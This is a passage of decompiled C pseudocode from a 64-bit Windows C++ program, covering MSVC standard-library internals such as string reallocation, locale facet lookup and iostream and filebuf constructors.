  __int64 v10; // [rsp+78h] [rbp-40h] BYREF
  __int64 v11; // [rsp+80h] [rbp-38h]
  __int64 v12; // [rsp+88h] [rbp-30h]
  __int64 v13; // [rsp+90h] [rbp-28h]
  __int64 v14; // [rsp+98h] [rbp-20h]
  __int64 v15; // [rsp+A0h] [rbp-18h] BYREF

  v6 = sub_140008610(a1);
  v8 = a1 + 1;
  v7 = a2 - *a1;
  v9 = a1[1] - *a1;
  if ( v9 == std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size(a1) )
    sub_14000A120();
  v15 = sub_140007EF0(a1, v9 + 1);
  v5 = std::_Allocate_at_least_helper<std::allocator<char>>(v6, &v15);
  v10 = v6;
  v11 = v5;
  v12 = v15;
  v14 = v5 + v7 + 1;
  v3 = unknown_libname_71(v7 + v5);
  sub_140003EA0(v6, v3, a3);
  v13 = v7 + v5;
  if ( a2 == *v8 )
  {
    sub_140003D80(*a1, *v8, v5, v6);
  }
  else
  {
    sub_140003D80(*a1, a2, v5, v6);
    v13 = v5;
    sub_140003D80(a2, *v8, v5 + v7 + 1, v6);
  }
  v11 = 0;
  sub_140007F90(a1, v5, v9 + 1, v15);
  sub_140006B20(&v10);
  return v7 + v5;
}


// ----- ??$_Fgetc@D@std@@YA_NAEADPEAU_iobuf@@@Z @ 0x140003000 -----
char __fastcall std::_Fgetc<char>(_BYTE *a1, FILE *a2)
{
  int v3; // [rsp+20h] [rbp-18h]

  v3 = fgetc(a2);
  if ( v3 == -1 )
    return 0;
  *a1 = v3;
  return 1;
}


// ----- _wcsset_s @ 0x140003040 -----
errno_t __cdecl wcsset_s(wchar_t *Destination, size_t SizeInWords, wchar_t Value)
{
  return sub_14000F610(Destination, SizeInWords, Value);
}


// ----- ??$_Fputc@D@std@@YA_NDPEAU_iobuf@@@Z @ 0x140003070 -----
_BOOL8 __fastcall std::_Fputc<char>(char a1, __int64 a2)
{
  return (unsigned int)sub_14001665C((unsigned int)a1, a2) != -1;
}


// ----- sub_1400030B0 @ 0x1400030b0 -----
__int64 __fastcall sub_1400030B0(__int64 a1)
{
  _BYTE v2[8]; // [rsp+20h] [rbp-18h] BYREF

  if ( *(_QWORD *)a1 == 0 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v2, 0);
    if ( *(_QWORD *)a1 == 0 )
      *(_QWORD *)a1 = ++dword_14009FDA0;
    std::_Lockit::~_Lockit((std::_Lockit *)v2);
  }
  return *(_QWORD *)a1;
}


// ----- ?__crt_fast_encode_pointer@@YA?AU__crt_fast_encoded_nullptr_t@@$$T@Z @ 0x140003130 -----
// Microsoft VisualC v14 64bit runtime
__int64 __crt_fast_encode_pointer()
{
  _BYTE v1[24]; // [rsp+0h] [rbp-18h] BYREF

  memset(v1, 0, 1u);
  return v1[0];
}


// ----- ??$_Get_size_of_n@$00@std@@YA_K_K@Z @ 0x140003160 -----
__int64 __fastcall std::_Get_size_of_n<1>(__int64 a1)
{
  return a1;
}


// ----- sub_140003180 @ 0x140003180 -----
__int64 __fastcall sub_140003180(unsigned __int64 a1, __int64 a2)
{
  if ( a1 > 0x7FFFFFFFFFFFFFFFLL )
    sub_140009BC0(a1, a2);
  return 2 * a1;
}


// ----- sub_1400031D0 @ 0x1400031d0 -----
__int64 __fastcall sub_1400031D0(unsigned __int64 a1, __int64 a2)
{
  if ( a1 > 0x3FFFFFFFFFFFFFFFLL )
    sub_140009BC0(a1, a2);
  return 4 * a1;
}


// ----- unknown_libname_72 @ 0x140003220 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_72(__int64 a1)
{
  return *(_QWORD *)a1;
}


// ----- sub_140003230 @ 0x140003230 -----
__int64 __fastcall sub_140003230(__int64 a1)
{
  return sub_140003980(a1);
}


// ----- sub_140003250 @ 0x140003250 -----
__int64 __fastcall sub_140003250(void *a1, const struct __crt_win32_buffer_empty_debug_info *a2)
{
  __crt_win32_buffer_no_resizing::deallocate(a1, a2);
  return sub_140003980(a1);
}


// ----- unknown_libname_7 @ 0x140003290 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_7(_QWORD *a1, _QWORD *a2)
{
  return (__int64)(*a2 - *a1) >> 1;
}


// ----- sub_1400032C0 @ 0x1400032c0 -----
__int64 (__fastcall ***sub_1400032C0())()
{
  return &off_14009E818;
}


// ----- sub_1400032D0 @ 0x1400032d0 -----
__int64 sub_1400032D0()
{
  return 0x7FFFFFFFFFFFFFFFLL;
}


// ----- sub_1400032F0 @ 0x1400032f0 -----
__int64 __fastcall sub_1400032F0(_QWORD *a1, _QWORD *a2)
{
  __int64 v3; // [rsp+20h] [rbp-58h]
  __int64 v4; // [rsp+28h] [rbp-50h]
  __int64 v5; // [rsp+48h] [rbp-30h]
  __int64 v6; // [rsp+50h] [rbp-28h] BYREF
  __int64 v7; // [rsp+58h] [rbp-20h]
  __int64 v8; // [rsp+60h] [rbp-18h]

  v3 = sub_140008610(a1);
  v5 = a1[1] - *a1;
  v4 = std::_Allocate_at_least_helper<std::allocator<char>>(v3, a2);
  v6 = v3;
  v7 = v4;
  v8 = *a2;
  sub_140003D80(*a1, a1[1], v4, v3);
  v7 = 0;
  sub_140007F90(a1, v4, v5, *a2);
  return sub_140006BF0(&v6);
}


// ----- sub_140003400 @ 0x140003400 -----
__int64 *__fastcall sub_140003400(__int64 *a1, unsigned __int64 a2, __int64 a3, int a4, __int64 a5)
{
  int v5; // eax
  __int64 v8; // [rsp+38h] [rbp-50h]
  unsigned __int64 v9; // [rsp+48h] [rbp-40h]
  __int64 v10; // [rsp+50h] [rbp-38h]
  __int64 v11; // [rsp+58h] [rbp-30h]
  int v12; // [rsp+60h] [rbp-28h]
  __int64 v13; // [rsp+68h] [rbp-20h] BYREF
  __int64 v14; // [rsp+70h] [rbp-18h] BYREF

  v8 = a1[2];
  if ( std::string::shrink_to_fit(a1) - v8 < a2 )
    sub_14000A100();
  v9 = a1[3];
  v14 = sub_140007CF0(a1, a2 + v8);
  v11 = sub_140008610(a1);
  v13 = sub_140001D50(v11, (unsigned __int64 *)&v14);
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  a1[2] = a2 + v8;
  a1[3] = v14;
  v12 = unknown_libname_71(v13);
  if ( v9 <= 0xF )
  {
    sub_1400070A0(v12, (_DWORD)a1, v8, a4, a5);
    sub_140002850((__int64)a1, &v13);
  }
  else
  {
    v10 = *a1;
    v5 = unknown_libname_71(*a1);
    sub_1400070A0(v12, v5, v8, a4, a5);
    sub_140008220(v11, v10, v9);
    *a1 = v13;
  }
  return a1;
}


// ----- sub_1400035D0 @ 0x1400035d0 -----
__int64 *__fastcall sub_1400035D0(__int64 *a1, unsigned __int64 a2, __int64 a3, int a4, __int64 a5)
{
  int v5; // eax
  __int64 v8; // [rsp+38h] [rbp-50h]
  unsigned __int64 v9; // [rsp+48h] [rbp-40h]
  __int64 v10; // [rsp+50h] [rbp-38h]
  __int64 v11; // [rsp+58h] [rbp-30h]
  int v12; // [rsp+60h] [rbp-28h]
  __int64 v13; // [rsp+68h] [rbp-20h] BYREF
  __int64 v14; // [rsp+70h] [rbp-18h] BYREF

  v8 = a1[2];
  if ( std::string::shrink_to_fit(a1) - v8 < a2 )
    sub_14000A100();
  v9 = a1[3];
  v14 = sub_140007DF0(a1, a2 + v8);
  v11 = sub_140008610(a1);
  v13 = sub_140001E10(v11, (unsigned __int64 *)&v14);
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  a1[2] = a2 + v8;
  a1[3] = v14;
  v12 = unknown_libname_71(v13);
  if ( v9 <= 7 )
  {
    sub_140007130(v12, (_DWORD)a1, v8, a4, a5);
    sub_140002850((__int64)a1, &v13);
  }
  else
  {
    v10 = *a1;
    v5 = unknown_libname_71(*a1);
    sub_140007130(v12, v5, v8, a4, a5);
    std::wstring::_Deallocate_for_capacity(v11, v10, v9);
    *a1 = v13;
  }
  return a1;
}


// ----- sub_1400037A0 @ 0x1400037a0 -----
__int64 *__fastcall sub_1400037A0(__int64 *a1, unsigned __int64 a2, __int64 a3, unsigned __int8 a4)
{
  __int64 v4; // rax
  __int64 v7; // [rsp+28h] [rbp-50h]
  unsigned __int64 v8; // [rsp+38h] [rbp-40h]
  __int64 v9; // [rsp+40h] [rbp-38h]
  __int64 v10; // [rsp+48h] [rbp-30h]
  __int64 v11; // [rsp+50h] [rbp-28h]
  __int64 v12; // [rsp+58h] [rbp-20h] BYREF
  __int64 v13; // [rsp+60h] [rbp-18h] BYREF

  v7 = a1[2];
  if ( std::string::shrink_to_fit(a1) - v7 < a2 )
    sub_14000A100();
  v8 = a1[3];
  v13 = sub_140007CF0(a1, a2 + v7);
  v10 = sub_140008610(a1);
  v12 = sub_140001D50(v10, (unsigned __int64 *)&v13);
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  a1[2] = a2 + v7;
  a1[3] = v13;
  v11 = unknown_libname_71(v12);
  if ( v8 <= 0xF )
  {
    sub_1400071B0(v11, a1, v7, a4);
    sub_140002850((__int64)a1, &v12);
  }
  else
  {
    v9 = *a1;
    v4 = unknown_libname_71(*a1);
    sub_1400071B0(v11, v4, v7, a4);
    sub_140008220(v10, v9, v8);
    *a1 = v12;
  }
  return a1;
}


// ----- sub_140003950 @ 0x140003950 -----
__int64 __fastcall sub_140003950(__int64 a1, _QWORD *a2)
{
  return sub_1400096C0(a1, *a2);
}


// ----- sub_140003980 @ 0x140003980 -----
__int64 __fastcall sub_140003980(__int64 *a1)
{
  return unknown_libname_71(*a1);
}


// ----- sub_1400039A0 @ 0x1400039a0 -----
__int64 __fastcall sub_1400039A0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14000A830(a1, a2, a3);
}


// ----- sub_1400039D0 @ 0x1400039d0 -----
__int64 __fastcall sub_1400039D0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14000A8C0(a1, a2, a3);
}


// ----- sub_140003A00 @ 0x140003a00 -----
bool __fastcall sub_140003A00(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  if ( a2 != a4 )
    return false;
  if ( a2 != 0 )
    return (unsigned int)sub_14000A7D0(a1, a3, a2) == 0;
  return true;
}


// ----- sub_140003A70 @ 0x140003a70 -----
__int64 __fastcall sub_140003A70(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, wchar_t a4)
{
  __int64 v5; // rax
  __int64 v6; // [rsp+30h] [rbp-18h]
  wchar_t v10; // [rsp+68h] [rbp+20h] BYREF

  v10 = a4;
  if ( a3 >= a2 )
    return -1;
  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    v6 = sub_14000B420(a1 + 2 * a3, a2 - a3, &v10);
    if ( v6 != 0 )
      return (v6 - a1) >> 1;
    else
      return -1;
  }
  else
  {
    LODWORD(v5) = wcsset_s((wchar_t *)(a1 + 2 * a3), a1 + 2 * a2, v10);
    if ( v5 == a1 + 2 * a2 )
      return -1;
    else
      return (v5 - a1) >> 1;
  }
}


// ----- sub_140003B70 @ 0x140003b70 -----
__int64 __fastcall sub_140003B70(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14000C160(a1, a2, a3);
}


// ----- sub_140003BA0 @ 0x140003ba0 -----
__int64 __fastcall sub_140003BA0(__int64 a1, __int64 a2, __int64 a3)
{
  return std::_Char_traits<wchar_t,unsigned short>::move(a1, a2, a3);
}


// ----- ??$_Ungetc@D@std@@YA_NAEBDPEAU_iobuf@@@Z @ 0x140003bd0 -----
_BOOL8 __fastcall std::_Ungetc<char>(unsigned __int8 *a1, FILE *a2)
{
  return ungetc(*a1, a2) != -1;
}


// ----- sub_140003C20 @ 0x140003c20 -----
__int64 __fastcall sub_140003C20(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rcx
  __int64 v6; // [rsp+28h] [rbp-60h]
  __int64 v7; // [rsp+30h] [rbp-58h]
  __int64 v8; // [rsp+38h] [rbp-50h]
  __int64 v9; // [rsp+40h] [rbp-48h]
  __int64 v10; // [rsp+48h] [rbp-40h] BYREF
  __int64 v11; // [rsp+50h] [rbp-38h] BYREF
  _BYTE v12[24]; // [rsp+58h] [rbp-30h] BYREF
  __int64 v13; // [rsp+90h] [rbp+8h] BYREF
  __int64 v14; // [rsp+98h] [rbp+10h] BYREF
  __int64 v15; // [rsp+A0h] [rbp+18h]
  __int64 v16; // [rsp+A8h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v14 = a2;
  v13 = a1;
  v10 = unknown_libname_72((__int64)&v13);
  v11 = unknown_libname_72((__int64)&v14);
  if ( (unsigned __int8)sub_1400092F0(v4) != 0 )
  {
    sub_14000A160(v12, 24);
    sub_140004590(v12, v15, v16);
    while ( v10 != v11 )
    {
      sub_140002BC0((__int64)v12, v10);
      v10 += 4;
    }
    v9 = sub_140009640(v12);
    sub_140006530(v12);
    return v9;
  }
  else
  {
    v6 = unknown_libname_71(v15);
    v7 = sub_140003980(&v11);
    v8 = sub_140003980(&v10);
    sub_140002A40(v8, v7, v6);
    v15 += 4 * ((v11 - v10) >> 2);
    return v15;
  }
}


// ----- sub_140003D80 @ 0x140003d80 -----
__int64 __fastcall sub_140003D80(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v7; // [rsp+20h] [rbp-48h]
  __int64 v8; // [rsp+28h] [rbp-40h]
  __int64 v9; // [rsp+30h] [rbp-38h]
  _BYTE v10[24]; // [rsp+38h] [rbp-30h] BYREF
  __int64 v11; // [rsp+70h] [rbp+8h] BYREF
  __int64 v12; // [rsp+78h] [rbp+10h] BYREF
  __int64 v13; // [rsp+80h] [rbp+18h]
  __int64 v14; // [rsp+88h] [rbp+20h]

  v14 = a4;
  v13 = a3;
  v12 = a2;
  v11 = a1;
  v7 = unknown_libname_72((__int64)&v11);
  v8 = unknown_libname_72((__int64)&v12);
  if ( (unsigned __int8)sub_1400092F0(v4) != 0 )
  {
    sub_14000A160(v10, 24);
    sub_140004590(v10, v13, v14);
    while ( v7 != v8 )
      sub_140002C20((__int64)v10, v7++);
    v9 = sub_140009640(v10);
    sub_140006530(v10);
    return v9;
  }
  else
  {
    v5 = unknown_libname_71(v13);
    sub_1400029B0(v7, v8, v5);
    return v8 - v7 + v13;
  }
}


// ----- sub_140003EA0 @ 0x140003ea0 -----
__int64 __fastcall sub_140003EA0(__int64 a1, __int64 a2, __int64 a3)
{
  return std::construct_at<char,char const &,0>(a2, a3);
}


// ----- sub_140003ED0 @ 0x140003ed0 -----
__int64 __fastcall sub_140003ED0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_140003F80(a2, a3);
}


// ----- ??$construct_at@D$$V$0A@@std@@YAPEADQEAD@Z @ 0x140003f00 -----
void *__fastcall std::construct_at<char,,0>(__int64 a1)
{
  void *v1; // rdi

  v1 = (void *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(1, a1);
  memset(v1, 0, 1u);
  return v1;
}


// ----- ??$construct_at@DAEBD$0A@@std@@YAPEADQEADAEBD@Z @ 0x140003f40 -----
_BYTE *__fastcall std::construct_at<char,char const &,0>(__int64 a1, _BYTE *a2)
{
  _BYTE *result; // rax

  result = (_BYTE *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(1, a1);
  *result = *a2;
  return result;
}


// ----- sub_140003F80 @ 0x140003f80 -----
_DWORD *__fastcall sub_140003F80(__int64 a1, _DWORD *a2)
{
  _DWORD *result; // rax

  result = (_DWORD *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(4, a1);
  *result = *a2;
  return result;
}


// ----- unknown_libname_8 @ 0x140003fc0 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_8(__int64 a1, _QWORD *a2)
{
  _QWORD *result; // rax

  result = (_QWORD *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(8, a1);
  *result = *a2;
  return result;
}


// ----- ??$construct_at@_W$$V$0A@@std@@YAPEA_WQEA_W@Z @ 0x140004000 -----
void *__fastcall std::construct_at<wchar_t,,0>(__int64 a1)
{
  void *v1; // rdi

  v1 = (void *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(2, a1);
  memset(v1, 0, 2u);
  return v1;
}


// ----- unknown_libname_9 @ 0x140004040 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_9(__int64 *a1, __int64 *a2)
{
  __int64 v3; // [rsp+0h] [rbp-18h]

  v3 = *a1;
  *a1 = *a2;
  return v3;
}


// ----- unknown_libname_10 @ 0x140004080 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_10(_QWORD *a1, _QWORD *a2)
{
  if ( *a1 >= *a2 )
    return a1;
  else
    return a2;
}


// ----- unknown_libname_11 @ 0x1400040d0 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_11(_QWORD *a1, _QWORD *a2)
{
  if ( *a2 >= *a1 )
    return a1;
  else
    return a2;
}


// ----- unknown_libname_12 @ 0x140004120 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_12(_QWORD *a1, _QWORD *a2)
{
  if ( *a2 >= *a1 )
    return a1;
  else
    return a2;
}


// ----- sub_140004170 @ 0x140004170 -----
_QWORD *sub_140004170(_QWORD *a1, ...)
{
  const struct __crt_win32_buffer_empty_debug_info *v1; // rax
  unsigned __int16 *v3; // [rsp+28h] [rbp-30h] BYREF
  _WORD *v4; // [rsp+30h] [rbp-28h] BYREF
  __int64 v5; // [rsp+38h] [rbp-20h] BYREF
  __int64 v7; // [rsp+68h] [rbp+10h] BYREF
  va_list va; // [rsp+68h] [rbp+10h]
  __int64 v9; // [rsp+70h] [rbp+18h] BYREF
  va_list va1; // [rsp+70h] [rbp+18h]
  __int64 v11; // [rsp+78h] [rbp+20h] BYREF
  va_list va2; // [rsp+78h] [rbp+20h]
  __int64 (__fastcall *v13)(_QWORD); // [rsp+80h] [rbp+28h]
  va_list va3; // [rsp+88h] [rbp+30h] BYREF

  va_start(va3, a1);
  va_start(va2, a1);
  va_start(va1, a1);
  va_start(va, a1);
  v7 = va_arg(va1, _QWORD);
  va_copy(va2, va1);
  v9 = va_arg(va2, _QWORD);
  va_copy(va3, va2);
  v11 = va_arg(va3, _QWORD);
  v13 = va_arg(va3, __int64 (__fastcall *)(_QWORD));
  __crt_win32_buffer_no_resizing::deallocate(va, (const struct __crt_win32_buffer_empty_debug_info *)va1);
  v3 = (unsigned __int16 *)sub_140003230((__int64)va);
  v5 = sub_140003230((__int64)va1);
  v1 = (const struct __crt_win32_buffer_empty_debug_info *)unknown_libname_7(&v3, &v5);
  v4 = (_WORD *)sub_140003250(va2, v1);
  while ( v3 != (unsigned __int16 *)v5 )
    *v4++ = v13(*v3++);
  sub_140003950((__int64)va2, &v4);
  *a1 = v11;
  return a1;
}


// ----- sub_140004270 @ 0x140004270 -----
const struct std::locale::facet *__fastcall sub_140004270(std::locale *a1)
{
  __int64 v2; // [rsp+20h] [rbp-48h]
  const struct std::locale::facet *v3; // [rsp+28h] [rbp-40h]
  __int64 v4; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v6[8]; // [rsp+48h] [rbp-20h] BYREF
  __int64 v7; // [rsp+50h] [rbp-18h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)v6, 0);
  v5 = qword_14009FC40;
  v4 = sub_1400030B0((__int64)&unk_14009FC38);
  v3 = std::locale::_Getfacet(a1, v4);
  if ( v3 == nullptr )
  {
    if ( v5 != 0 )
    {
      v3 = (const struct std::locale::facet *)v5;
    }
    else if ( sub_140008630(&v5, a1) == -1 )
    {
      sub_140009BF0();
    }
    else
    {
      v2 = v5;
      sub_14000A160(&v7, 8);
      sub_140001790(&v7, v2);
      sub_14000F9B0(v2);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 8LL))(v2);
      qword_14009FC40 = v5;
      v3 = (const struct std::locale::facet *)v5;
      sub_14000CFA0(&v7);
      sub_1400069C0(&v7);
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v6);
  return v3;
}


// ----- sub_1400043A0 @ 0x1400043a0 -----
const struct std::locale::facet *__fastcall sub_1400043A0(std::locale *a1)
{
  __int64 v2; // [rsp+20h] [rbp-48h]
  const struct std::locale::facet *v3; // [rsp+28h] [rbp-40h]
  __int64 v4; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v6[8]; // [rsp+48h] [rbp-20h] BYREF
  __int64 v7; // [rsp+50h] [rbp-18h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)v6, 0);
  v5 = qword_14009FC30;
  v4 = sub_1400030B0((__int64)&unk_14009FDB8);
  v3 = std::locale::_Getfacet(a1, v4);
  if ( v3 == nullptr )
  {
    if ( v5 != 0 )
    {
      v3 = (const struct std::locale::facet *)v5;
    }
    else if ( sub_140008730(&v5, a1) == -1 )
    {
      sub_140009BF0();
    }
    else
    {
      v2 = v5;
      sub_14000A160(&v7, 8);
      sub_140001790(&v7, v2);
      sub_14000F9B0(v2);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 8LL))(v2);
      qword_14009FC30 = v5;
      v3 = (const struct std::locale::facet *)v5;
      sub_14000CFA0(&v7);
      sub_1400069C0(&v7);
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v6);
  return v3;
}


// ----- ??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QEAXU_Mutex_count_pair@?A0xd833279a@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAA@PEAU?$_Tree_node@U?$pair@QEAXU_Mutex_count_pair@?A0xd833279a@@@std@@PEAX@1@PEBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@QEAXU_Mutex_count_pair@?A0xd833279a@@@std@@@std@@@1@@Z @ 0x1400044d0 -----
_QWORD *__fastcall std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>>,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>>,std::_Iterator_base0>(
        _QWORD *a1,
        __int64 a2,
        const struct __crt_win32_buffer_empty_debug_info *a3)
{
  *a1 = a2;
  __crt_win32_buffer_no_resizing::deallocate(a1, a3);
  return a1;
}


// ----- sub_140004510 @ 0x140004510 -----
_QWORD *__fastcall sub_140004510(_QWORD *a1, __int64 a2, const struct __crt_win32_buffer_empty_debug_info *a3)
{
  std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>>,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>>,std::_Iterator_base0>(
    a1,
    a2,
    a3);
  return a1;
}


// ----- sub_140004550 @ 0x140004550 -----
__int64 __fastcall sub_140004550(__int64 a1)
{
  unknown_libname_14(a1);
  *(_QWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 24) = 0;
  return a1;
}


// ----- sub_140004590 @ 0x140004590 -----
_QWORD *__fastcall sub_140004590(_QWORD *a1, __int64 a2, __int64 a3)
{
  *a1 = a2;
  a1[1] = a2;
  a1[2] = a3;
  return a1;
}


// ----- unknown_libname_73 @ 0x1400045d0 -----
// Microsoft VisualC 64bit universal runtime
_QWORD *__fastcall unknown_libname_73(_QWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  return a1;
}


// ----- ??0?$_Yarn@D@std@@QEAA@XZ @ 0x140004610 -----
__int64 __fastcall std::_Yarn<char>::_Yarn<char>(__int64 a1)
{
  *(_QWORD *)a1 = 0;
  *(_BYTE *)(a1 + 8) = 0;
  return a1;
}


// ----- ??0?$_Yarn@_W@std@@QEAA@XZ @ 0x140004630 -----
__int64 __fastcall std::_Yarn<wchar_t>::_Yarn<wchar_t>(__int64 a1)
{
  *(_QWORD *)a1 = 0;
  *(_WORD *)(a1 + 8) = 0;
  return a1;
}


// ----- sub_140004660 @ 0x140004660 -----
_QWORD *__fastcall sub_140004660(_QWORD *a1)
{
  sub_140004C30(a1);
  *a1 = &std::filebuf::`vftable';
  sub_140008AF0(a1, 0, 0);
  return a1;
}


// ----- ??0?$basic_ios@DU?$char_traits@D@std@@@std@@IEAA@XZ @ 0x1400046a0 -----
__int64 __fastcall std::ios::ios(__int64 a1)
{
  std::ios_base::ios_base((std::ios_base *)a1);
  *(_QWORD *)a1 = &std::ios::`vftable';
  *(_QWORD *)(a1 + 72) = 0;
  *(_QWORD *)(a1 + 80) = 0;
  *(_BYTE *)(a1 + 88) = 0;
  return a1;
}


// ----- ??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z @ 0x1400046f0 -----
_QWORD *__fastcall std::iostream::iostream(_QWORD *a1, __int64 a2, int a3)
{
  if ( a3 != 0 )
  {
    *a1 = &unk_14008C6B8;
    a1[2] = &unk_14008C6C0;
    std::ios::ios((__int64)(a1 + 4));
  }
  sub_1400047D0(a1, a2, 0, 0);
  std::ostream::ostream(a1 + 2, 0, 0, 0);
  *(_QWORD *)((char *)a1 + *(int *)(*a1 + 4LL)) = &std::iostream::`vftable';
  *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4LL) - 4) = *(_DWORD *)(*a1 + 4LL) - 32;
  return a1;
}


// ----- sub_1400047D0 @ 0x1400047d0 -----
_QWORD *__fastcall sub_1400047D0(_QWORD *a1, __int64 a2, unsigned __int8 a3, int a4)
{
  if ( a4 != 0 )
  {
    *a1 = &unk_14008C6A0;
    std::ios::ios((__int64)(a1 + 3));
  }
  *(_QWORD *)((char *)a1 + *(int *)(*a1 + 4LL)) = &std::istream::`vftable';
  *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4LL) - 4) = *(_DWORD *)(*a1 + 4LL) - 24;
  a1[1] = 0;
  std::ios::init((char *)a1 + *(int *)(*a1 + 4LL), a2, a3);
  return a1;
}


// ----- sub_1400048B0 @ 0x1400048b0 -----
__int64 __fastcall sub_1400048B0(__int64 a1, __int64 a2, int a3, int a4, int a5)
{
  int v5; // eax

  v5 = sub_14000A400(a2);
  sub_140004940(a1, v5, a3, a4, a5);
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL)) = &std::ofstream::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL) - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 168;
  return a1;
}


// ----- sub_140004940 @ 0x140004940 -----
_QWORD *__fastcall sub_140004940(_QWORD *a1, __int64 a2, int a3, unsigned int a4, int a5)
{
  __int64 v5; // rax

  if ( a5 != 0 )
  {
    *a1 = &unk_14008C688;
    std::ios::ios((__int64)(a1 + 21));
  }
  v5 = unknown_libname_71((__int64)(a1 + 1));
  sub_140004A80(a1, v5, 0, 0);
  *(_QWORD *)((char *)a1 + *(int *)(*a1 + 4LL)) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4LL) - 4) = *(_DWORD *)(*a1 + 4LL) - 168;
  sub_140004660(a1 + 1);
  if ( sub_14000C430(a1 + 1, a2, a3 | 2u, a4) == 0 )
    sub_14000DA70((char *)a1 + *(int *)(*a1 + 4LL), 2, 0);
  return a1;
}


// ----- sub_140004A80 @ 0x140004a80 -----
__int64 __fastcall sub_140004A80(__int64 a1, __int64 a2, unsigned __int8 a3, int a4)
{
  if ( a4 != 0 )
  {
    *(_QWORD *)a1 = &unk_14008C570;
    std::ios::ios(a1 + 16);
  }
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL)) = &std::ostream::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL) - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 16;
  std::ios::init(*(int *)(*(_QWORD *)a1 + 4LL) + a1, a2, a3);
  return a1;
}


// ----- ??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@W4_Uninitialized@1@_N@Z @ 0x140004b50 -----
__int64 __fastcall std::ostream::ostream(__int64 a1, __int64 a2, char a3, int a4)
{
  if ( a4 != 0 )
  {
    *(_QWORD *)a1 = &unk_14008C570;
    std::ios::ios(a1 + 16);
  }
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL)) = &std::ostream::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)a1 + 4LL) - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 16;
  if ( a3 != 0 )
  {
    if ( a1 != 0 )
      std::ios_base::_Addstd((struct std::ios_base *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1));
    else
      std::ios_base::_Addstd(nullptr);
  }
  return a1;
}


// ----- sub_140004C30 @ 0x140004c30 -----
__int64 __fastcall sub_140004C30(__int64 a1)
{
  std::locale *v2; // [rsp+20h] [rbp-18h]
  __int64 v3; // [rsp+28h] [rbp-10h]

  *(_QWORD *)a1 = &std::streambuf::`vftable';
  *(_QWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 24) = 0;
  *(_QWORD *)(a1 + 32) = 0;
